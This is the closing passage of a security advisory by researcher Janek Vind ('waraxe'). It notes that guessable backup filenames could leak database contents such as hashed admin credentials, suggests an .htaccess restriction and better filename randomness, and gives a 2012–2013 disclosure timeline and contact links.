+may be realistic and as result sensitive data leakage from database may occur
+(hashed admin credentials for example).
+
+Possible solutions:
+ 1. .htaccess file restricting directory access
+ 2. better filename randomness
+
+
+Disclosure timeline:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+27.09.2012 -> Contacted developers
+27.09.2012 -> Developer asked for details
+28.09.2012 -> Sent details to developers
+27.01.2013 -> Patched version 7.02.06 released
+27.02.2013 -> Advisory released
+
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+come2waraxe@yahoo.com
+Janek Vind "waraxe"
+
+Waraxe forum:  http://www.waraxe.us/forums.html
+Personal homepage: http://www.janekvind.com/
+Random project: http://albumnow.com/
+---------------------------------- [ EOF ] ------------------------------------
